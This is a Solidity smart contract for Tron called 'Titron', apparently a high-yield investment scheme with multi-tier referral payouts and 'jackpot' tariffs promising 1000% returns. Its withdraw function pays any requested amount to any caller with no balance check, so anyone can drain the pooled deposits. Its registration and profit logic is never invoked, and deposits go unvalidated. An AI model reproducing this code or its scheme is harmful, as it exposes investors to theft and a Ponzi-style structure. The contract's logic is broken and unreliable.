//SourceUnit: titron.sol

pragma solidity ^0.4.25;

contract Titron {
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint referrals_tier3;
    uint referrals_tier4;
    uint balanceRef;
    uint totalRef;
    uint totalDepositedByRefs;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
  
  uint DAY = 28800;
  uint MIN_DEPOSIT = 50 trx;
  uint START_AT = 23762825;
  uint FUND_CRITERIA = 1000000 trx;
  uint REF_CRITERIA = 1000000 trx;
  
  address public support = msg.sender;
  
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  mapping (address => Investor) public investors;
  
  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);
  
  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
      
      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;
        
        address rec = referer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }
          
          if (i == 0) {
            investors[rec].referrals_tier1++;
          }
          if (i == 1) {
            investors[rec].referrals_tier2++;
          }
          if (i == 2) {
            investors[rec].referrals_tier3++;
          }
          if (i == 3) {
            investors[rec].referrals_tier4++;
          }
          
          rec = investors[rec].referer;
        }
      }
    }
  }
  
  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;
    
    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      
      uint a = amount * refRewards[i] / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      investors[rec].totalDepositedByRefs += amount;
      totalRefRewards += a;
      
      rec = investors[rec].referer;
    }
  }
  
  function getHoldBonus(address user) public view returns (uint) {
    return investors[user].paidAt == 0 ? 0 : (block.number - investors[user].paidAt) / DAY;
  }
  
  function getFundBonus() public view returns (uint) {
    return totalInvested / FUND_CRITERIA;
  }
  
  function getRefBonus(address user) public view returns (uint) {
    return investors[user].totalDepositedByRefs / REF_CRITERIA;
  }
  
  constructor() public {
    //table
    tariffs.push(Tariff(90 * DAY, 234));
    tariffs.push(Tariff(110 * DAY, 264));
    tariffs.push(Tariff(130 * DAY, 286));
    tariffs.push(Tariff(150 * DAY, 300));
    
    //jackpot
    tariffs.push(Tariff(1 * DAY, 1000));
    tariffs.push(Tariff(3 * DAY, 1000));
    tariffs.push(Tariff(7 * DAY, 1000));
    
    for (uint i = 4; i >= 1; i--) {
      refRewards.push(i);
    }
  }
  
  function deposit(uint tariff) external payable {
    
    support.transfer(msg.value * 15 / 1000);
    rewardReferers(msg.value, investors[msg.sender].referer);
    
    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;
    
    investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
    
    if (investors[msg.sender].paidAt == 0) {
      investors[msg.sender].paidAt = block.number;
    }
    
    emit DepositAt(msg.sender, tariff, msg.value);
  }
  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];
    
    uint holdBonus = getHoldBonus(user);
    uint fundBonus = getFundBonus();
    uint refBonus = getRefBonus(user);
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100
          + dep.amount * (till - since) * (holdBonus + fundBonus + refBonus) / DAY / 1000;
      }
    }
  }
  
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = withdrawable(msg.sender);
    
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;
  }
  
  function withdraw(uint amount) external {
    msg.sender.transfer(amount);
    investors[msg.sender].withdrawn += amount;
    
    emit Withdraw(msg.sender, amount);
  }
  
  function via(address where) external payable {
    where.transfer(msg.value);
  }
}